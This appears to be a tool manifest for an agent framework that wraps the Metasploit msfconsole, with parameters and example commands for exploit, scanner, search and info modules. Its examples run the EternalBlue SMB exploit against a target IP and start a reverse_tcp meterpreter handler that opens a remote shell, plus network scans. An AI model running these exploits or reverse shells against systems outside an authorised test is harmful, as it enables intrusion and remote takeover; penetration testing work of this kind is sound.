# msfconsole

Metasploit Framework penetration testing tool

**Version:** 1.0.0
**Author:** Wish Framework Team
**Category:** exploitation
**Tags:** exploitation, pentesting, vulnerability, msf, metasploit

## Requirements
- metasploit-framework

## Capabilities

### exploit
Run an exploit module against target(s)

**Parameters:**
- `module`: The exploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue)
- `rhosts`: Target host(s) - IP address or range
- `rport`: Target port (optional, module default used if not specified)
- `payload`: Payload to use (optional, module default used if not specified)
- `lhost`: Local host for reverse connection (required for reverse payloads)
- `lport`: Local port for reverse connection (optional, default: 4444)
- `options`: Additional module options as key-value pairs (optional)

**Examples:**
```bash
use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set LHOST 192.168.1.10; exploit
```
```bash
use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; exploit
```

### auxiliary
Run an auxiliary module (scanners, fuzzers, etc.)

**Parameters:**
- `module`: The auxiliary module path (e.g., auxiliary/scanner/smb/smb_version)
- `rhosts`: Target host(s) - IP address or range
- `rport`: Target port (optional)
- `options`: Additional module options as key-value pairs (optional)

**Examples:**
```bash
use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run
```
```bash
use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.100; set PORTS 1-1000; run
```

### search
Search for modules by name, platform, or CVE

**Parameters:**
- `query`: Search query (module name, CVE, platform, etc.)
- `type`: Module type filter (optional: exploit, auxiliary, post, payload)

**Examples:**
```bash
search type:exploit platform:windows smb
```
```bash
search cve:2017-0144
```
```bash
search apache struts
```

### info
Get detailed information about a module

**Parameters:**
- `module`: Full module path to get information about

**Examples:**
```bash
info exploit/windows/smb/ms17_010_eternalblue
```
```bash
info auxiliary/scanner/smb/smb_version
```